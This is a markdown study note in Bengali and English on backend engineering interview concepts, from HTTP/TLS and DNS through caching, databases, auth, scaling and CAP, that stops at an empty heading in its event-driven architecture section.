---
title: 'Backend Concepts'
description: 'এই নোটটা backend interview, system design, production debugging, এবং senior-level thinking মাথায় রেখে সাজানো।'
category: 'Backend'
---

# Backend Concepts: Interview + Senior-Level Notes

এই নোটটা backend interview, system design, production debugging, এবং senior-level thinking মাথায় রেখে সাজানো। প্রতিটি concept-এ শুধু definition না, বরং কীভাবে কাজ করে, কোথায় ব্যবহার হয়, common mistake কী, এবং interview-তে কীভাবে explain করতে হয় সেটা রাখা হয়েছে।

## 1. HTTP vs HTTPS

### Core Idea

- **HTTP (HyperText Transfer Protocol):** Client এবং server-এর মধ্যে request-response communication protocol।এটি একটি অ্যাপ্লিকেশন লেয়ার প্রোটোকল যা ক্লায়েন্ট (ব্রাউজার) এবং সার্ভারের মধ্যে ডেটা আদান-প্রদান করে। এটি Stateless এবং ডেটা পাঠায় Plain Text আকারে।

- **HTTPS:** HTTP-এর secure version। এখানে HTTP traffic TLS/SSL দিয়ে encrypted থাকে। এটি মূলত HTTP-র একটি সুরক্ষিত সংস্করণ। এখানে HTTP-র নিচে একটি সিকিউরিটি লেয়ার থাকে যাকে বলা হয় TLS (Transport Layer Security)। আগে একে SSL বলা হতো, তবে এখন TLS-ই স্ট্যান্ডার্ড।

### HTTP কীভাবে কাজ করে

Client browser বা app server-এ request পাঠায়:

```text
Client -> HTTP Request -> Server
Client <- HTTP Response <- Server
```

**The Handshake Steps:**

- Client Hello: ক্লায়েন্ট সার্ভারকে বলে, "আমি এই TLS ভার্সন এবং এই Cipher Suites সাপোর্ট করি।"
- Server Hello & Certificate: সার্ভার তার Public Key এবং একটি Digital Certificate পাঠায়।
- Authentication: ব্রাউজার চেক করে দেখে যে সার্টিফিকেটটি ট্রাস্টেড কোনো CA (Certificate Authority) দ্বারা সাইন করা কি না।
- Key Exchange: এখানেই ম্যাজিক ঘটে। ক্লায়েন্ট এবং সার্ভার মিলে একটি Session Key তৈরি করে। (এখানে Asymmetric Encryption যেমন RSA বা Diffie-Hellman ব্যবহার হয়)।
- Encrypted Session: একবার Session Key তৈরি হয়ে গেলে, পরবর্তী সব ডেটা Symmetric Encryption দিয়ে আদান-প্রদান হয় কারণ এটি অনেক ফাস্ট।

**একটি HTTP request-এ সাধারণত থাকে:**

- Method: `GET`, `POST`, `PUT`, `PATCH`, `DELETE`
- URL/path
- Headers
- Body, যদি লাগে

**একটি HTTP response-এ থাকে:**

- Status code: `200`, `201`, `400`, `401`, `404`, `500`
- Headers
- Body

### HTTPS কী যোগ করে

HTTPS HTTP-এর উপর TLS layer যোগ করে:

```text
HTTP + TLS = HTTPS
```

TLS দেয়:

- **Encryption:** মাঝপথে কেউ packet sniff করলেও data পড়তে পারবে না।
- **Integrity:** data মাঝপথে change হয়েছে কি না detect করা যায়।
- **Authentication:** client নিশ্চিত হয় সে আসল server-এর সাথেই কথা বলছে।

### Senior Insight

HTTPS শুধু security না। Modern browser এবং protocol support-এর জন্যও গুরুত্বপূর্ণ:

- HTTP/2 সাধারণত HTTPS ছাড়া browser-এ enable হয় না।
- HTTP/3 QUIC-এর উপর চলে, সেটাও secure transport ব্যবহার করে।
- TLS termination কোথায় হবে, যেমন load balancer, Nginx, API Gateway, এটা architecture decision।
- Internal service-to-service communication-এও অনেক company mTLS ব্যবহার করে।

### Common Mistakes

- HTTPS থাকলেই app secure, এমন ভাবা ভুল। XSS, CSRF, SQL Injection আলাদা problem।
- TLS certificate expire হলে production outage হতে পারে।
- Mixed content, অর্থাৎ HTTPS page থেকে HTTP resource load করলে browser block করতে পারে।

### Interview Angle

Short answer:

> HTTP plain text protocol, HTTPS হলো HTTP over TLS। HTTPS encryption, integrity, এবং server identity verification দেয়। Production system-এ HTTPS mandatory, কারণ security ছাড়াও HTTP/2, browser trust, cookie security, এবং compliance-এর জন্য এটা দরকার।

## 2. TCP vs UDP

### Core Idea

- **TCP(Transmission Control Protocol):** Reliable, connection-oriented transport protocol।
- **UDP(User Datagram Protocol):** Fast, connectionless transport protocol।

### TCP কী দেয়

TCP connection establish করতে 3-way handshake করে:

```text
Client -> SYN
Server -> SYN-ACK
Client -> ACK
```

TCP features:

- Ordered delivery
- Lost packet retransmission
- Flow control
- Congestion control
- Connection state

### UDP কী দেয়

UDP packet পাঠায়, কিন্তু delivery guarantee দেয় না।

UDP features:

- No handshake
- Low latency
- No built-in retry
- No ordering guarantee
- Lightweight

### কোথায় কোনটা ব্যবহার হয়

TCP:

- HTTP/1.1
- HTTP/2
- Database connection
- Email protocols
- File transfer

UDP:

- DNS
- Video streaming
- Online gaming
- VoIP
- QUIC/HTTP/3

### Senior Insight

UDP মানেই unreliable app না। App layer নিজে reliability build করতে পারে। HTTP/3 QUIC UDP-এর উপর চলে, কিন্তু QUIC নিজে reliability, encryption, multiplexing দেয়।

TCP-এর Head-of-Line Blocking problem আছে। একটি packet হারালে পরের packet ready থাকলেও application layer wait করতে পারে। HTTP/2 multiplexing করলেও TCP-level blocking পুরো connection affect করতে পারে। HTTP/3 এই problem কমায়।

### Common Mistakes

- UDP always bad, এটা ভুল।
- TCP always fast, এটাও ভুল। Reliability-এর cost আছে।
- Real-time system-এ পুরনো packet retry করা অনেক সময় useless।

### Interview Angle

> TCP reliability, ordering, এবং congestion control দেয়। UDP lightweight এবং low latency। API, database, file transfer-এ TCP ভালো। Gaming, streaming, DNS, এবং QUIC/HTTP3-এর মতো latency-sensitive system-এ UDP useful।

## 3. DNS Resolution Flow

### Core Idea

DNS domain name-কে IP address-এ convert করে।

```text
example.com -> 93.184.216.34
```

### Resolution Flow

User browser-এ `google.com` লিখলে সাধারণ flow:

1. Browser cache check করে।
2. OS cache check করে।
3. Router বা local network cache check হতে পারে।
4. Recursive resolver, সাধারণত ISP, Google DNS, Cloudflare DNS।
5. Root DNS server।
6. TLD server, যেমন `.com`।
7. Authoritative name server।
8. IP address return হয়।

```text
Browser -> OS -> Resolver -> Root -> TLD -> Authoritative DNS -> IP
```

### DNS Record Types

- **A:** Domain থেকে IPv4 address।
- **AAAA:** Domain থেকে IPv6 address।
- **CNAME:** Alias domain।
- **MX:** Mail server।
- **TXT:** Verification, SPF, DKIM।
- **NS:** Name server।

### TTL কী

TTL (Time To Live) বলে DNS result কতক্ষণ cache থাকবে।

Low TTL:

- Fast migration
- More DNS traffic

High TTL:

- Less DNS lookup
- Migration slow হতে পারে

### Senior Insight

Production migration-এর আগে TTL কমিয়ে রাখা হয়। নতুন server/IP cutover করার পর আবার TTL বাড়ানো হয়।

DNS issue debug করতে জানতে হয়:

```bash
dig example.com
nslookup example.com
```

DNS cache stale থাকলে user পুরনো server hit করতে পারে। অনেক outage আসলে DNS propagation বা cache issue।

### Common Mistakes

- DNS propagation instant ভাবা।
- CNAME root domain-এ সব provider support করে ভাবা।
- DNS cache clear না করে deploy issue debug করা।

### Interview Angle

> DNS একটি hierarchical lookup system। Browser cache থেকে শুরু করে recursive resolver, root, TLD, authoritative server পর্যন্ত query যায়। TTL caching behavior control করে। Production migration-এ TTL strategy খুব important।

## 4. What Happens When You Type a URL

### High-Level Flow

Browser-এ `https://example.com/products` দিলে:

1. URL parse হয়।
2. DNS lookup করে IP বের হয়।
3. TCP connection establish হয়।
4. HTTPS হলে TLS handshake হয়।
5. HTTP request পাঠানো হয়।
6. Server request process করে।
7. Response browser-এ আসে।
8. Browser HTML parse করে।
9. CSS, JS, image fetch করে।
10. Render tree তৈরি হয়।
11. Layout, paint, composite হয়।

### Backend Side Flow

Server side-এ request আসলে:

```text
Load Balancer -> Web Server -> App Server -> DB/Cache/Queue -> Response
```

Backend সাধারণত করে:

- Routing
- Authentication
- Authorization
- Validation
- Business logic
- Database query
- Cache access
- Logging/metrics/tracing
- Response formatting

### Senior Insight

এই প্রশ্ন system thinking test করে। শুধু browser না, network, TLS, CDN, load balancer, app server, DB, cache, এবং rendering সব explain করতে পারলে strong impression পড়ে।

Production setup-এ request হয়তো সরাসরি app server-এ যায় না:

```text
Browser -> DNS -> CDN -> WAF -> Load Balancer -> API Gateway -> Service -> DB
```

### Common Mistakes

- DNS lookup সবসময় হয় ভাবা। Cache থাকলে DNS skip হতে পারে।
- TCP connection সবসময় new হয় ভাবা। Keep-alive থাকলে reuse হয়।
- Backend response পেলেই page ready হয় ভাবা। Browser rendering আলাদা process।

### Interview Angle

> URL enter করার পর browser DNS resolve করে, TCP/TLS connection তৈরি করে, HTTP request পাঠায়। Request CDN/load balancer/API gateway হয়ে backend service-এ যায়। Backend auth, validation, business logic, DB/cache কাজ করে response দেয়। Browser তারপর HTML/CSS/JS parse করে render করে।

## 5. REST vs GraphQL

### REST Core Idea

REST resource-based API style।

Example:

```text
GET /users/1
GET /users/1/orders
POST /orders
```

REST commonly uses:

- HTTP methods
- Status codes
- Resource URLs
- Stateless request

### GraphQL Core Idea

GraphQL-এ client query দিয়ে বলে কোন fields দরকার।

```graphql
query {
  user(id: "1") {
    name
    orders {
      id
      total
    }
  }
}
```

একটি endpoint থাকে:

```text
POST /graphql
```

### REST-এর সুবিধা

- Simple
- HTTP caching সহজ
- Observability সহজ
- Browser/proxy/CDN support ভালো
- Learning curve কম

### REST-এর সমস্যা

- Over-fetching
- Under-fetching
- অনেক endpoint maintain করতে হয়
- Mobile app-এর জন্য custom response দরকার হতে পারে

### GraphQL-এর সুবিধা

- Client exact data নেয়
- Multiple resource এক query-তে পাওয়া যায়
- Strong schema
- Frontend velocity বাড়ে

### GraphQL-এর সমস্যা

- Caching harder
- Query complexity control করতে হয়
- N+1 problem বেশি দেখা যায়
- Authorization field-level করতে হয়
- Monitoring REST-এর মতো straightforward না

### Senior Insight

GraphQL API public করলে query depth limit, cost analysis, persisted queries, rate limiting, and DataLoader pattern জানা দরকার।

REST-এর জন্য BFF বা aggregation endpoint অনেক সময় GraphQL-এর complexity ছাড়াই mobile/frontend problem solve করে।

### Common Mistakes

- GraphQL মানেই better API ভাবা।
- REST মানেই old ভাবা।
- GraphQL-এ auth শুধু resolver level-এ না করে central policy ছাড়া রাখা।

### Interview Angle

> REST resource-oriented and cache-friendly। GraphQL client-driven and flexible। REST simple system, public APIs, CDN caching-এ ভালো। GraphQL complex frontend data needs, multiple clients, schema-driven development-এ ভালো। Senior decision depends on caching, auth, observability, complexity, and team maturity।

## 6. Idempotency in APIs

### Core Idea

একই request একাধিকবার করলে final state একই থাকলে সেটা idempotent।

### Method Behavior

- `GET`: idempotent, কারণ data read করে।
- `PUT`: idempotent, কারণ resource পুরো replace করে same value set করে।
- `DELETE`: সাধারণত idempotent, কারণ resource delete হয়ে গেলে আবার delete করলেও final state deleted।
- `POST`: সাধারণত not idempotent, কারণ প্রতিবার নতুন resource create করতে পারে।

### Payment Example

User payment button double-click করলো। যদি backend দুইবার charge করে, এটা বড় bug।

Solution:

```text
Idempotency-Key: unique-client-generated-key
```

Backend সেই key store করে:

- First request process করে result save করে।
- Same key আবার এলে নতুন charge না করে saved result return করে।

### Senior Insight

Idempotency শুধু payment না। Order creation, booking, message processing, webhook handling, retryable APIs সব জায়গায় দরকার।

Distributed system-এ network timeout হলে client জানে না request success হয়েছে কি না। Retry করলে duplicate side effect হতে পারে। Idempotency এই problem solve করে।

### Implementation Notes

Store:

- Idempotency key
- Request hash
- Status
- Response/result
- Expiry time

Important:

- Same key but different payload হলে reject করা উচিত।
- DB unique constraint ব্যবহার করা উচিত।
- Race condition avoid করতে transaction/lock দরকার হতে পারে।

### Common Mistakes

- শুধু frontend button disable করে duplicate prevent করতে চাওয়া।
- Idempotency key memory-তে রাখা, ফলে multi-server setup-এ fail।
- Key expire policy না রাখা।

### Interview Angle

> Idempotency ensures repeated identical requests do not create duplicate side effects। Payment/order APIs-এ client-generated `Idempotency-Key` store করে first result reuse করা হয়। Distributed retries এবং network timeout handle করার জন্য এটা critical।

## 7. Rate Limiting Strategies

### Core Idea

Rate limiting controls how many requests a user/IP/API key can make within a time period।

### কেন দরকার

- Abuse prevention
- DDoS mitigation
- Cost control
- Fair usage
- Backend/database protection

### Common Strategies

#### Fixed Window Counter

Example:

```text
100 requests per minute
```

প্রতি minute counter reset।

Pros:

- Simple

Cons:

- Boundary problem। 12:00:59-এ 100 request, 12:01:00-এ আবার 100 request।

#### Sliding Window

Last N seconds/minutes-এর request count দেখে।

Pros:

- More accurate

Cons:

- More storage/computation

#### Token Bucket

Bucket-এ token জমে। Request করতে token লাগে।

Pros:

- Burst allow করে
- Smooth average rate রাখে

#### Leaky Bucket

Request queue-তে পড়ে এবং fixed rate-এ process হয়।

Pros:

- Smooth output

Cons:

- Queue full হলে reject/drop

### Senior Insight

Single server-এ in-memory rate limiter easy, কিন্তু distributed system-এ Redis, API Gateway, or edge layer দরকার।

Rate limit key হতে পারে:

- IP
- User ID
- API key
- Organization ID
- Route-specific key

Response should include:

```text
HTTP 429 Too Many Requests
Retry-After: 30
```

### Common Mistakes

- শুধু IP-based limit ব্যবহার করা। NAT/proxy-এর কারণে অনেক user একই IP share করতে পারে।
- Login endpoint-এ rate limit না রাখা।
- Expensive endpoint এবং cheap endpoint একই limit দেওয়া।
- Redis unavailable হলে fail open না fail closed হবে সেটা decide না করা।

### Interview Angle

> Rate limiting protects system from abuse and overload। Fixed window simple, sliding window accurate, token bucket burst-friendly, leaky bucket smooths traffic। Distributed setup-এ Redis/API Gateway/CDN layer-এ limiter রাখা হয়।

## 8. Authentication vs Authorization

### Core Idea

- **Authentication:** আপনি কে?
- **Authorization:** আপনি কী করতে পারবেন?

### Example

Authentication:

```text
User login করলো email/password দিয়ে।
```

Authorization:

```text
এই user কি admin panel access করতে পারবে?
```

### Authentication Methods

- Password login
- OTP
- OAuth
- SSO
- Magic link
- API key
- mTLS

### Authorization Models

- **RBAC:** Role-based access control। যেমন admin, editor, viewer।
- **ABAC:** Attribute-based access control। যেমন department, region, ownership।
- **ACL:** Resource-specific permissions।
- **Policy-based:** Rules engine, যেমন OPA।

### Senior Insight

Authentication successful হলেই authorization successful না। Production app-এ every sensitive route and resource-level permission check করতে হয়।

Example:

```text
GET /orders/123
```

User logged in, কিন্তু order `123` কি তার নিজের? এই ownership check না থাকলে IDOR vulnerability হয়।

### Common Mistakes

- Frontend hide করলেই secure ভাবা।
- শুধু role check করে resource ownership check না করা।
- JWT decode করে signature verify না করা।
- Admin API-তে audit log না রাখা।

### Interview Angle

> Authentication verifies identity, authorization checks permissions. A user can be authenticated but not authorized. Senior implementation includes route-level, resource-level, and action-level permission checks with audit logging.

## 9. JWT vs Sessions

### Session-Based Auth

Server login-এর পর session create করে:

```text
session_id -> server-side session store
```

Browser cookie-তে session ID থাকে।

Pros:

- Server can revoke session easily
- Token small
- Sensitive data server-side

Cons:

- Server-side storage দরকার
- Horizontal scaling-এ shared session store লাগে

### JWT-Based Auth

JWT token client-side থাকে। Token-এর মধ্যে claims থাকে:

```json
{
  "sub": "user_123",
  "role": "admin",
  "exp": 1710000000
}
```

JWT parts:

```text
header.payload.signature
```

Pros:

- Stateless verification
- Microservice-friendly
- Cross-domain/mobile API-তে convenient

Cons:

- Revoke করা hard
- Token leak হলে risk
- Payload encrypted না, শুধু base64url encoded
- Token বড় হলে overhead

### Access Token vs Refresh Token

- **Access token:** short-lived, API access-এর জন্য।
- **Refresh token:** long-lived, নতুন access token issue করার জন্য।

### Senior Insight

JWT encrypted না, signed। তাই sensitive data JWT payload-এ রাখা যাবে না।

Production pattern:

- Short-lived access token
- Refresh token rotation
- Refresh token store/revoke list
- `HttpOnly`, `Secure`, `SameSite` cookie
- Key rotation with `kid`

### Common Mistakes

- JWT localStorage-এ রেখে XSS risk বাড়ানো।
- Token expiry না রাখা।
- Refresh token reuse detection না রাখা।
- Logout করলে token revoke strategy না থাকা।

### Interview Angle

> Sessions are server-side state referenced by a cookie. JWT is a signed self-contained token. JWT scales well for stateless APIs but revocation is harder. Sessions are easier to revoke but need shared storage in distributed systems.

## 10. Cookies vs Tokens

### Cookies

Cookie browser automatically sends with matching domain/path request।

Important attributes:

- `HttpOnly`: JS দিয়ে পড়া যাবে না।
- `Secure`: শুধু HTTPS-এ পাঠাবে।
- `SameSite`: CSRF reduce করে।
- `Domain`
- `Path`
- `Max-Age` / `Expires`

### Tokens

Token manually header-এ পাঠানো হয়:

```text
Authorization: Bearer <token>
```

### Cookie Pros

- Browser-managed
- `HttpOnly` দিলে XSS থেকে token stealing কঠিন
- Traditional web apps-এর জন্য ভালো

### Cookie Cons

- Automatically sent হয়, তাই CSRF risk
- Cross-site configuration tricky

### Token Pros

- Mobile/API clients-এর জন্য easy
- CSRF less likely যদি cookie automatic না পাঠায়

### Token Cons

- localStorage-এ রাখলে XSS risk
- Manual storage/refresh logic লাগে

### Senior Insight

Best practice often:

- Browser web app: `HttpOnly Secure SameSite` cookie
- Mobile/native app: secure storage + bearer token
- SPA: BFF pattern বা secure cookie-based auth অনেক সময় safer

### Common Mistakes

- `HttpOnly` ছাড়া auth cookie রাখা।
- `SameSite=None` দিলে `Secure` না দেওয়া।
- XSS থাকলে localStorage token safe ভাবা।

### Interview Angle

> Cookies are automatically managed by browsers and can be protected with HttpOnly/Secure/SameSite, but CSRF must be handled. Bearer tokens are manually sent and useful for APIs/mobile, but storage security is critical.

## 11. Caching (Redis, CDN, Cache Invalidation)

### Core Idea

Cache frequently used data closer to the user or app to reduce latency and backend load।

### Cache Layers

```text
Browser Cache -> CDN -> Reverse Proxy -> App Cache -> Redis -> Database
```

### CDN

CDN static or cacheable content user-এর কাছাকাছি edge location থেকে serve করে।

Good for:

- Images
- CSS/JS
- Videos
- Public API response

### Redis

Redis memory-based data store। Dynamic data cache, session, rate limit, queue, lock ইত্যাদিতে ব্যবহার হয়।

### Common Cache Patterns

#### Cache Aside

App first cache check করে। Miss হলে DB থেকে data এনে cache set করে।

```text
Read -> Cache miss -> DB -> Set cache -> Return
```

#### Write Through

Data write হলে cache এবং DB দুটোতেই write হয়।

#### Write Behind

Cache-এ write হয়, পরে async DB write হয়।

#### Read Through

Cache layer নিজে DB থেকে data load করে।

### Cache Invalidation

সবচেয়ে কঠিন part। Data update হলে stale cache remove/update করতে হয়।

Strategies:

- TTL-based expiry
- Explicit delete on write
- Versioned cache key
- Event-based invalidation
- Stale-while-revalidate

### Senior Insight

Cache stampede বড় production problem। Popular key expire হলে অনেক request একসাথে DB hit করে।

Solution:

- Locking
- Request coalescing
- Jittered TTL
- Serve stale data while refreshing

### Common Mistakes

- Cache invalidation না ভাবা।
- User-specific data public cache করা।
- No TTL cache রাখা।
- Cache failure হলে app fail করা।

### Interview Angle

> Cache reduces latency and DB load. CDN handles edge/static cache, Redis handles dynamic/server-side cache. Senior-level caching requires invalidation strategy, TTL, stampede protection, and correctness vs performance trade-off.

## 12. Database Indexing

### Core Idea

Index হলো database table-এর জন্য lookup structure, যা query fast করে।

Without index:

```text
Full table scan
```

With index:

```text
Index lookup -> row fetch
```

### Common Index Types

- **B-Tree Index:** Range query, equality query, sorting-এর জন্য common।
- **Hash Index:** Equality lookup-এর জন্য।
- **GIN/GiST:** PostgreSQL full-text, JSONB, array, geospatial।
- **Composite Index:** Multiple column-এর index।

### Example

Query:

```sql
SELECT * FROM users WHERE email = 'a@example.com';
```

Index:

```sql
CREATE INDEX idx_users_email ON users(email);
```

### Composite Index Order

```sql
CREATE INDEX idx_orders_user_status ON orders(user_id, status);
```

এই index ভালো:

```sql
WHERE user_id = 1
WHERE user_id = 1 AND status = 'paid'
```

কিন্তু শুধু `status` দিয়ে query করলে সবসময় effective নাও হতে পারে।

### Senior Insight

Index read fast করে, কিন্তু write slow করে। কারণ insert/update/delete হলে index-ও update করতে হয়।

Production-এ index add করার আগে:

- Query pattern বুঝতে হয়।
- `EXPLAIN ANALYZE` দেখতে হয়।
- Cardinality check করতে হয়।
- Large table-এ concurrent index build দরকার হতে পারে।

### Common Mistakes

- সব column index করা।
- Low-cardinality column, যেমন boolean, blindly index করা।
- Query function use করে index break করা:

```sql
WHERE LOWER(email) = 'x'
```

যদি functional index না থাকে।

### Interview Angle

> Index is a data structure that speeds reads by avoiding full table scans. But it costs storage and slows writes. Senior engineers use query plans, cardinality, composite index order, and workload pattern before adding indexes.

## 13. SQL vs NoSQL Trade-offs

### SQL

Relational databases:

- PostgreSQL
- MySQL
- SQL Server

Features:

- Structured schema
- SQL query language
- Joins
- ACID transactions
- Strong consistency

### NoSQL

Types:

- Document DB: MongoDB
- Key-value: Redis, DynamoDB
- Column-family: Cassandra
- Graph DB: Neo4j

Features:

- Flexible schema
- Horizontal scaling
- High write throughput
- Data model query-driven

### SQL Good For

- Financial data
- Complex relationships
- Transactions
- Reporting
- Strong consistency

### NoSQL Good For

- High-scale event/log writes
- Flexible documents
- Key-value lookups
- Distributed low-latency systems

### Senior Insight

Decision should be based on access pattern, consistency need, transaction requirement, and scaling model।

NoSQL schema-less না। Schema application layer-এ shift হয়। ভুল data model করলে NoSQL-ও slow হয়।

### Common Mistakes

- SQL does not scale, এটা ভুল।
- NoSQL মানেই faster, এটাও ভুল।
- MongoDB নিয়ে relational join-heavy workload চালানো।
- Transaction দরকার এমন system NoSQL-এ নেওয়া without design।

### Interview Angle

> SQL is better for structured relational data, transactions, and complex querying. NoSQL is better for flexible schema and horizontal scale for specific access patterns. Senior choice depends on consistency, query shape, transaction need, and operational maturity.

## 14. ACID vs BASE

### ACID

ACID ensures reliable transactions।

- **Atomicity:** সব কাজ হবে, নাহলে কিছুই হবে না।
- **Consistency:** Database valid state-এ থাকবে।
- **Isolation:** Concurrent transaction একে অন্যকে corrupt করবে না।
- **Durability:** Commit হলে data হারাবে না।

### BASE

BASE distributed availability-focused model।

- **Basically Available:** System available থাকবে।
- **Soft State:** State temporarily inconsistent হতে পারে।
- **Eventual Consistency:** পরে গিয়ে consistent হবে।

### Example

Bank transfer:

- ACID দরকার।
- টাকা deduct হলো কিন্তু add হলো না, এটা চলবে না।

Social media likes count:

- Eventual consistency acceptable।
- Like count ২ সেকেন্ড পরে update হলেও problem কম।

### Senior Insight

ACID vs BASE binary choice না। Modern databases অনেক hybrid behavior দেয়।

Distributed systems-এ transaction across services কঠিন। তাই Saga pattern, outbox pattern, idempotent consumers ব্যবহার হয়।

### Common Mistakes

- Eventual consistency মানেই incorrect ভাবা।
- ACID সব জায়গায় দরকার ভাবা।
- Distributed transaction casually design করা।

### Interview Angle

> ACID prioritizes correctness and transactional guarantees. BASE prioritizes availability and eventual consistency. Senior engineers choose based on business correctness requirements, not technology fashion.

## 15. Normalization vs Denormalization

### Normalization

Data duplicate কমানোর জন্য table ভাগ করা।

Example:

```text
users
orders
order_items
products
```

Pros:

- Less duplication
- Data consistency
- Easier updates

Cons:

- Joins বেশি লাগে
- Read query complex হতে পারে

### Denormalization

Read fast করার জন্য duplicate data রাখা।

Example:

```text
orders table-এ customer_name রাখা
```

Pros:

- Faster reads
- Fewer joins
- Good for analytics/feed/search

Cons:

- Data duplication
- Update consistency problem

### Senior Insight

OLTP system-এ normalized model common। High-read system, analytics, search index, feed, reporting-এ denormalized model common।

Denormalization করলে sync strategy দরকার:

- Event-driven update
- Background job
- Materialized view
- CDC (Change Data Capture)

### Common Mistakes

- Early denormalization।
- Data duplicate করে update strategy না রাখা।
- Every query join-heavy রেখে performance ignore করা।

### Interview Angle

> Normalization improves consistency and reduces duplication. Denormalization improves read performance by duplicating data. Senior engineers denormalize intentionally with a sync/invalidation strategy.

## 16. Connection Pooling

### Core Idea

Database connection তৈরি করা expensive। Connection pool আগে থেকে কিছু connection open রাখে এবং request-গুলো সেগুলো reuse করে।

### Without Pool

```text
Every request -> New DB connection -> Query -> Close
```

Problem:

- Slow
- DB connection limit hit
- CPU overhead

### With Pool

```text
Request -> Borrow connection -> Query -> Return to pool
```

### Pool Settings

- Max connections
- Min idle connections
- Connection timeout
- Idle timeout
- Max lifetime

### Senior Insight

Pool size blindly বড় করলে DB crash করতে পারে। ধরুন ২০টি app instance, প্রতিটিতে pool size ৫০:

```text
20 * 50 = 1000 DB connections
```

DB যদি 500 connection support করে, production fail।

Use PgBouncer/RDS Proxy for large systems।

### Common Mistakes

- Connection release না করা।
- Transaction open রেখে pool block করা।
- Serverless function থেকে too many connections।
- Pool per request create করা।

### Interview Angle

> Connection pooling reuses database connections to reduce overhead and avoid connection storms. Senior engineers calculate total connections across instances and tune pool size according to DB capacity.

## 17. N+1 Query Problem

### Core Idea

একটি parent list আনার পর প্রতিটি item-এর জন্য আলাদা query করলে N+1 problem হয়।

Example:

```text
1 query for users
N queries for each user's orders
```

### Bad Example

```sql
SELECT * FROM users;
-- loop users
SELECT * FROM orders WHERE user_id = ?;
```

### Solutions

- SQL `JOIN`
- Batch query with `WHERE IN`
- ORM eager loading
- GraphQL DataLoader

### Senior Insight

N+1 often hidden থাকে ORM/GraphQL resolver-এর মধ্যে। Local dev data ছোট হলে বোঝা যায় না, production data বড় হলে latency explode করে।

Use:

- Query logging
- APM tracing
- DB metrics
- Load testing

### Common Mistakes

- ORM relation access loop-এর ভিতরে করা।
- GraphQL nested field resolver optimize না করা।
- Pagination ছাড়া huge join করা।

### Interview Angle

> N+1 happens when fetching a list triggers one extra query per item. It is fixed with joins, batching, eager loading, or DataLoader. Senior engineers detect it using query logs and tracing.

## 18. Pagination (Offset vs Cursor)

### Offset Pagination

```sql
SELECT * FROM posts ORDER BY created_at DESC LIMIT 10 OFFSET 1000;
```

Pros:

- Simple
- Page number support easy

Cons:

- Large offset slow
- New data insert হলে duplicate/missing result হতে পারে

### Cursor Pagination

```sql
SELECT * FROM posts
WHERE created_at < '2026-01-01'
ORDER BY created_at DESC
LIMIT 10;
```

Pros:

- Fast for large data
- Stable for infinite scroll

Cons:

- Random page jump hard
- Cursor design careful হতে হয়

### Cursor Design

Cursor often includes:

- Sort field, e.g. `created_at`
- Tie-breaker, e.g. `id`

```sql
WHERE (created_at, id) < (?, ?)
ORDER BY created_at DESC, id DESC
```

### Senior Insight

Cursor pagination requires deterministic ordering। শুধু `created_at` দিলে same timestamp-এ duplicate/missing হতে পারে। Tie-breaker হিসেবে `id` ব্যবহার করা ভালো।

### Common Mistakes

- Large table-এ huge offset।
- Order by ছাড়া pagination।
- Cursor expose করার সময় raw internal data leak।

### Interview Angle

> Offset pagination is simple but slow and unstable for large changing datasets. Cursor pagination uses indexed ordered fields and is better for feeds/infinite scroll. Senior implementation uses deterministic ordering with a tie-breaker.

## 19. Load Balancing (L4 vs L7)

### Core Idea

Load balancer traffic multiple servers-এর মধ্যে distribute করে।

### L4 Load Balancer

Works at transport layer।

Uses:

- IP
- Port
- TCP/UDP

Pros:

- Fast
- Lower overhead

Cons:

- HTTP content বুঝে না।

### L7 Load Balancer

Works at application layer।

Uses:

- URL path
- Host header
- HTTP method
- Cookie
- Header

Example:

```text
/api/users -> user-service
/api/orders -> order-service
```

### Load Balancing Algorithms

- Round robin
- Least connections
- Weighted round robin
- IP hash
- Consistent hashing

### Senior Insight

Health checks critical। Dead server-এ traffic পাঠালে outage হয়।

Sticky session sometimes দরকার, কিন্তু stateless app design better। Session external store-এ রাখলে sticky dependency কমে।

### Common Mistakes

- Health check শুধু port open কিনা দেখে, actual readiness না দেখা।
- Slow server still healthy দেখানো।
- Load balancer timeout app timeout-এর সাথে align না করা।

### Interview Angle

> L4 balances TCP/UDP traffic based on IP/port. L7 understands HTTP and can route based on path/header/host. Senior systems include health checks, retries, timeouts, and stateless app design.

## 20. Horizontal vs Vertical Scaling

### Vertical Scaling

একটি server-এর CPU/RAM/storage বাড়ানো।

Pros:

- Simple
- App change কম

Cons:

- Hardware limit
- Single point of failure
- Expensive at high end

### Horizontal Scaling

আরও server/node যোগ করা।

Pros:

- More scalable
- Better availability
- Rolling deploy possible

Cons:

- Distributed complexity
- Shared state problem
- Load balancing দরকার

### Senior Insight

Horizontal scaling করতে app stateless হওয়া দরকার। State externalize করতে হয়:

- Session -> Redis/database
- Files -> object storage
- Jobs -> queue
- Cache -> shared cache

### Common Mistakes

- App memory-তে session রেখে horizontal scale করা।
- File upload local disk-এ রেখে multiple server চালানো।
- DB bottleneck ignore করা।

### Interview Angle

> Vertical scaling increases one machine's capacity. Horizontal scaling adds more machines. Senior engineers design stateless services and externalize shared state before horizontal scaling.

## 21. CAP Theorem

### Core Idea

Distributed system network partition হলে একসাথে তিনটি guarantee রাখা যায় না:

- **Consistency:** সব node same latest data দেখবে।
- **Availability:** every request response পাবে।
- **Partition Tolerance:** network split হলেও system চলবে।

### Reality

Distributed system-এ partition tolerance unavoidable। তাই partition হলে choice হয়:

- CP: consistency over availability
- AP: availability over consistency

### Example

CP:

- Banking balance
- Inventory reservation

AP:

- Social feed
- Likes count
- Analytics event ingestion

### Senior Insight

CAP only during network partition meaningful। Normal situation-এ system C এবং A দুটোই দিতে পারে।

CAP simplified model। Real system-এ latency, consistency levels, quorum, conflict resolution, business requirements আরও important।

### Common Mistakes

- “Pick any two” blindly বলা।
- Partition tolerance optional ভাবা।
- Every system same consistency দরকার ভাবা।

### Interview Angle

> CAP says during network partition a distributed system must choose between consistency and availability. Since partitions are unavoidable, CP systems reject/timeout some requests to stay consistent, while AP systems serve requests with possible stale/conflicting data.

## 22. Event-Driven Architecture

### Core Idea

Services directly call না করে event publish/subscribe করে।

Example:

```text
OrderCreated -> Payment Service
OrderCreated -> Email Service
OrderCreated -> Analytics Service
```

### Benefits

- Decoupling
- Async processing
- Scalability
- Easy extension
- Better resilience

### Challenges

- Eventual consistency
- Debugging harder
- Duplicate events
- Ordering issues
- Schema evolution

### Senior Insight

Event-driven system-এ exactly-once delivery খুব কঠিন। Practical design হয়:

- At-least-once delivery
- Idempotent consumers
- Deduplication key
- Outbox pattern
- Dead letter queue

### Common Mistakes

- Event publish করলেই transaction complete ভাবা।
- Consumer idempotent না করা।
- Event schema versioning না রাখা।
- Event order assume করা।

### Interview Angle

